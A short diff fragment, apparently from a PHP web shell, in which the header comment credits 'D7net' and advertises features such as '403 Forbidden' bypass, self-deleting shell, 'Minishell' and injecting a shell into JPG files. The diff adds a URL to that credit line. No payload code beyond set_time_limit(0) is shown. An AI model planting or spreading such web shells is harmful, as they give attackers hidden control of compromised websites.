@@ -2,7 +2,7 @@
 
 /*
     Shell Bypass 403 Forbidden / Auto Delete Shell / PHP Malware Detector / Minishell
-    Inject Shell To JPG By D7net 
+    Inject Shell To JPG By D7net / http://opetolol.eu.org/ 
 */
 
 set_time_limit(0);
